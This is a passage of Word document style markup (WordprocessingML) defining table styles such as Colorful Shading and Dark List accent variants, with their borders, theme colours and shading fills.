      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="24" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:left w:val="single" w:sz="4" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:bottom w:val="single" w:sz="4" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:right w:val="single" w:sz="4" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        <w:insideV w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="FBEDE8" w:themeFill="accent2" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="D94D2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12D14" w:themeFill="accent2" w:themeFillShade="99"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="single" w:sz="4" w:space="0" w:color="812D14" w:themeColor="accent2" w:themeShade="99"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="812D1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12D14" w:themeFill="accent2" w:themeFillShade="99"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F1B6A5" w:themeFill="accent2" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="EDA58F" w:themeFill="accent2" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="neCell">
      <w:rPr>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="nwCell">
      <w:rPr>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulShading-Accent3">
    <w:name w:val="Colorful Shading Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="71"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="24" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:left w:val="single" w:sz="4" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:bottom w:val="single" w:sz="4" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:right w:val="single" w:sz="4" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        <w:insideV w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="F6F6F7" w:themeFill="accent3" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="00929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1626C" w:themeFill="accent3" w:themeFillShade="99"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="single" w:sz="4" w:space="0" w:color="61626C" w:themeColor="accent3" w:themeShade="99"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="6162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1626C" w:themeFill="accent3" w:themeFillShade="99"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="DBDCDF" w:themeFill="accent3" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="D3D3D7" w:themeFill="accent3" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulShading-Accent4">
    <w:name w:val="Colorful Shading Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="71"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="24" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:left w:val="single" w:sz="4" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:bottom w:val="single" w:sz="4" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:right w:val="single" w:sz="4" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        <w:insideV w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="DCFCFF" w:themeFill="accent4" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="A7A8B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75F" w:themeFill="accent4" w:themeFillShade="99"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="single" w:sz="4" w:space="0" w:color="00575F" w:themeColor="accent4" w:themeShade="99"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="00575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575F" w:themeFill="accent4" w:themeFillShade="99"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="72F3FF" w:themeFill="accent4" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="50F0FF" w:themeFill="accent4" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="neCell">
      <w:rPr>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="nwCell">
      <w:rPr>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulShading-Accent5">
    <w:name w:val="Colorful Shading Accent 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="71"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="24" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:left w:val="single" w:sz="4" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:bottom w:val="single" w:sz="4" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:right w:val="single" w:sz="4" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        <w:insideV w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="E2EFF7" w:themeFill="accent5" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="00769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23044" w:themeFill="accent5" w:themeFillShade="99"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="single" w:sz="4" w:space="0" w:color="123044" w:themeColor="accent5" w:themeShade="99"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="12304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23044" w:themeFill="accent5" w:themeFillShade="99"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="8ABFE0" w:themeFill="accent5" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D9" w:themeFill="accent5" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="neCell">
      <w:rPr>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="nwCell">
      <w:rPr>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulShading-Accent6">
    <w:name w:val="Colorful Shading Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="71"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="24" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:left w:val="single" w:sz="4" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:bottom w:val="single" w:sz="4" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:right w:val="single" w:sz="4" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        <w:insideV w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="DBF6FF" w:themeFill="accent6" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="1E527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65B" w:themeFill="accent6" w:themeFillShade="99"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="single" w:sz="4" w:space="0" w:color="00465B" w:themeColor="accent6" w:themeShade="99"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="00465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465B" w:themeFill="accent6" w:themeFillShade="99"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6FDEFF" w:themeFill="accent6" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="4CD6FF" w:themeFill="accent6" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="neCell">
      <w:rPr>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="nwCell">
      <w:rPr>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="DarkList">
    <w:name w:val="Dark List"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="70"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="1E5272" w:themeFill="text1"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="18" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="1E5272" w:themeFill="text1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="0F2838"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63D55"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63D55" w:themeFill="text1" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="163D55" w:themeFill="text1" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="163D55" w:themeFill="text1" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="DarkList-Accent1">
    <w:name w:val="Dark List Accent 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="70"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="68727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E5272" w:themeFill="text1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="3338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E555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E555C" w:themeFill="accent1" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="4E555C" w:themeFill="accent1" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="4E555C" w:themeFill="accent1" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="DarkList-Accent2">
    <w:name w:val="Dark List Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="70"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="D94D2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E5272" w:themeFill="text1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="6C261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2391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23919" w:themeFill="accent2" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A23919" w:themeFill="accent2" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A23919" w:themeFill="accent2" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="DarkList-Accent3">
    <w:name w:val="Dark List Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="70"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="A7A8B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E5272" w:themeFill="text1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="50515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97B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97B87" w:themeFill="accent3" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="797B87" w:themeFill="accent3" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="797B87" w:themeFill="accent3" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="DarkList-Accent4">
    <w:name w:val="Dark List Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="70"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="00929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E5272" w:themeFill="text1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="00484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6D7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6D77" w:themeFill="accent4" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="006D77" w:themeFill="accent4" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="006D77" w:themeFill="accent4" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="DarkList-Accent5">
    <w:name w:val="Dark List Accent 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="70"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="1E527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E5272" w:themeFill="text1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="0F283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63D5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63D55" w:themeFill="accent5" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="163D55" w:themeFill="accent5" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="163D55" w:themeFill="accent5" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="DarkList-Accent6">
    <w:name w:val="Dark List Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="70"/>
    <w:semiHidden/>
